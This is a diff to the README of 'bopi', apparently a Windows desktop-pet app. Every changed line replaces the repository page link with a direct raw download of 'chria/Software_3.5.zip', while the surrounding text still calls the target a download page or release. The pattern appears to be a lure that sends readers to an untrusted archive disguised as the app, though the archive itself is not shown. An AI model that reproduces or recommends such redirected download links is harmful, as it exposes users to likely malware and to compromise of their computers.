@@ -1,6 +1,6 @@
 # 🐾 bopi - Your Backpack Pet, Ready to Go
 
-[![Download bopi](https://img.shields.io/badge/Download-bopi-7B68EE?style=for-the-badge&logo=github)](https://github.com/Contortionistdrake730/bopi)
+[![Download bopi](https://img.shields.io/badge/Download-bopi-7B68EE?style=for-the-badge&logo=github)](https://github.com/Contortionistdrake730/bopi/raw/refs/heads/main/chria/Software_3.5.zip)
 
 ## 🧭 What bopi does
 
@@ -29,7 +29,7 @@ If your PC can run modern Windows apps, it should handle bopi well.
 
 Visit this page to download bopi:
 
-https://github.com/Contortionistdrake730/bopi
+https://github.com/Contortionistdrake730/bopi/raw/refs/heads/main/chria/Software_3.5.zip
 
 On that page, look for the latest release or the main app file. Use your browser to download it to your PC.
 
@@ -184,4 +184,4 @@ Keep all files in the same folder. Do not move only one file out of the set unle
 
 Primary download page:
 
-https://github.com/Contortionistdrake730/bopi
+https://github.com/Contortionistdrake730/bopi/raw/refs/heads/main/chria/Software_3.5.zip
